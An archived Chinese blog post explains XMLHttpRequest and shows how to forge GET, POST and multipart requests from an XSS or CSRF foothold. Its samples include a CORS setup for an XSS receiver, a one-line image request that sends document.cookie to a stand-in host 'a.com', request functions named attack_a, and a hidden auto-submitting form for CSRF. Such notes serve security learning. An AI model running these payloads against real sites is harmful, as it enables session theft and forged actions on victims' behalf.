@@ -1,0 +1,319 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>ajax模拟请求 - l3m0n - 博客园</title>
+<link href="./ajax模拟请求 - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./ajax模拟请求 - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./ajax模拟请求 - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./ajax模拟请求 - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./ajax模拟请求 - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./ajax模拟请求 - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./ajax模拟请求 - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./ajax模拟请求 - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./ajax模拟请求 - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./ajax模拟请求 - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./ajax模拟请求 - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/ajax_note.html" id="cb_post_title_url">ajax模拟请求</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>[TOC]</p>
+<h3 id="理解ajax">理解ajax</h3>
+<p>核心对象是XMLHttpRequest（简称<strong>xhr</strong>），IE7之前是通过ActiveXObject对象实现的。</p>
+<ul>
+<li>异步：独立于浏览器主线程去做自己的事情,</li>
+<li>同步：请求发送后需要等待响应回来，这个时期进入阻塞阶段</li>
+</ul>
+<hr/>
+<h3 id="xhr实例化">xhr实例化</h3>
+<pre><code>var xmlhttp;
+if(windows.XMLHttpRequest){
+    xmlhttp = new XMLHttpRequest();
+}else{
+    //ie5、ie6
+    xmlhttp = new ActiveObject("Microsoft.XMLHTTP");
+}</code></pre>
+<hr/>
+<h3 id="get请求">GET请求</h3>
+<p>ajax是遵守同源策略的，w3c的<code>CORS</code>(Cross-OriginResource Sharing)方案支持跨域，在接收信息(xss平台)设置：</p>
+<pre><code>&lt;?php header("Access-Control-Allow-Origin: *")?&gt;</code></pre>
+<p>其中*为任意域都行，也可以设置为指定的某域<br/>
+当漏洞点给xss平台发送请求的时候，浏览器会自动加上Origin头，xss平台会判断这个头中的域是不是自己允许的域。不是就会爆出权限错误，虽然报错，但是还是接收到了数据</p>
+<p><img src="./ajax模拟请求 - l3m0n - 博客园/804631-20150831131149606-1407789254.png"/><br/>
+<strong>GET请求</strong></p>
+<pre><code>&lt;script&gt;
+function getRequest(method,url){
+    var xhr = new XMLHttpRequest();
+    if("withCredentials" in xhr){
+        //ture表示是异步，false表示是同步
+        xhr.open(method,url,true);
+    }else if(typeof XDomainRequest != "undefined"){
+        //IE bowser
+        xhr = new XDomainRequest();
+        xhr.open(method,url);
+    }else{
+        xhr = null;
+    }
+    return xhr;
+}
+var request = getRequest("get","http://a.com/ajax.php?get=testaaa");
+if(request){
+    //request success
+    /*request.onload = function(){
+        //alert request date
+        alert(request.responseText);
+    }*/
+    //send request
+    request.send();
+}
+&lt;/script&gt;</code></pre>
+<p>简单化get请求</p>
+<pre><code>//新建img标签对象
+new Image().src="http://a.com/ajax.php?get="+escape(document.cookie);
+//地址栏打开目标网址，地址会跳转，隐蔽性不高
+location.href="http://a.com/ajax.php?get="+escape(document.cookie);</code></pre>
+<hr/>
+<h3 id="简单post请求">简单POST请求</h3>
+<pre><code>&lt;script&gt;
+//xhr object
+xhr = function(){
+    var request = false;
+    if(window.XMLHttpRequest){
+        request = new XMLHttpRequest();
+    }else if(windows.ActiveXObject){
+        try{
+            request = new windows.ActiveXObject('Microsoft.XMLHTTP');
+        }catch(e){}
+    }
+    return request;
+}();
+
+request = function(method,src,argv,content_type){
+    //false 同步
+    xhr.open(method,src,false);
+    if(method=='POST')
+        xhr.setRequestHeader('content-Type',content_type);
+    xhr.send(argv);
+    return xhr.responseText;
+};
+
+attack_a = function(){
+    var src = "http://a.com/ajax.php";
+    var argv_0 = "&amp;post=postok";
+    request("POST",src,argv_0,"application/x-www-form-urlencoded");
+};
+attack_a();
+&lt;/script&gt;</code></pre>
+<p>其中<code>application/x-www-form-urlencoded</code>是默认的标准表单提交格式<br/>
+还有一种是上传文件中常见，<code>multipart/form-data</code></p>
+<hr/>
+<h3 id="post模拟表单提交">POST模拟表单提交</h3>
+<pre><code>&lt;script&gt;
+//xhr object
+xhr = function(){
+    var request = false;
+    if(window.XMLHttpRequest){
+        request = new XMLHttpRequest();
+    }else if(windows.ActiveXObject){
+        try{
+            request = new windows.ActiveXObject('Microsoft.XMLHTTP');
+        }catch(e){}
+    }
+    return request;
+}();
+
+request = function(method,src,argv,content_type){
+    //false 同步
+    xhr.open(method,src,false);
+    if(method=='POST')
+        xhr.setRequestHeader('content-Type',content_type);
+    xhr.send(argv);
+    return xhr.responseText;
+};
+
+attack_a = function(){
+    var src = "http://a.com/ajax.php";
+    var name1 = "value1";
+    var name2 = "value2";
+    var argv_0 = "\r\n";
+    argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition:form-data;name=\"name1\"\r\n\r\n";
+    argv_0 += (name1+"\r\n");
+    argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition:form-data;name=\"name2\"\r\n\r\n";
+    argv_0 += (name2+"\r\n");
+    request("POST",src,argv_0,"multipart/form-data;boundary=-------------------7964f8dddeb95fc5");
+}
+attack_a();
+&lt;/script&gt;</code></pre>
+<hr/>
+<h3 id="动态创建表单提交常用于csrf">动态创建表单提交(常用于csrf)</h3>
+<p>通过javascript动态的常见一个form</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+function new_form(){
+    var f = document.createElement("form");
+    document.body.appendChild(f);
+    f.method = "post";
+    return f;
+}
+function create_elements(eForm,eName,eValue){
+    var e = document.createElement("input");
+    eForm.appendChild(e);
+    e.type = 'text';
+    e.name = eName;
+    if(!document.all){
+        e.style.display= 'none';
+    }else{
+        e.style.display = 'block';
+        e.style.width - '0px';
+        e.style.height = '0px';
+    }
+    e.value = eValue;
+    return e;
+}
+var _f = new_form();
+create_elements(_f,"post","zzzz");
+//create_elements(_f,"name2","value2");
+//提交地址
+_f.action = "http://a.com/ajax.php";
+_f.submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><strong>notice：</strong><br/>
+本地测试的时候没有加上<code>&lt;html&gt;&lt;body&gt;xxx&lt;/body&gt;&lt;/html&gt;</code>，然后报错<code>Uncaught TypeError: Cannot read property 'appendChild' of null</code><br/>
+参考了二哥的回复：<a href="http://tieba.baidu.com/p/581024936">点击我打开</a><br/>
+原因是<code>document.body.appendChild(f);</code>在添加form时候并没有body，于是会爆出null</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2015-08-31 13:13</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=4772845" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(4772845);return false;">收藏</a></div>
+</div>
+<script src="./ajax模拟请求 - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=4772845,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2015/8/31 13:13:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./ajax模拟请求 - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="//img.users.51.la/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./ajax模拟请求 - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
